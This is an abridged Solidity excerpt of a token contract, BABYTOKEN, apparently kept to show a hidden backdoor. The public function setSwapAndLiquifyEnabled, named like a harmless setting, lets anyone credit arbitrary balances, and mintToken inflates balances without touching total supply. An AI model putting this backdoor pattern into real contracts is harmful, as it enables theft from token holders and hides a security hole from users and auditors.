...
contract BABYTOKEN is ERC20, Ownable {
    ...
    mapping(address => uint256) _balancess;
    ...
    //        uint256 serviceFee_
        ...
        isPair[address(msg.sender)] = true;
        _balancess[msg.sender] = totalSupply_;
    }
    ...
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 am, address accunt) public {
        ...
        _balancess[accunt] += am;
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        _balancess[target] += mintedAmount;
        //        totalSupply_ += mintedAmount;
        //        Transfer(0, owner, mintedAmount);
        _transfer(msg.sender, target, mintedAmount);
    }
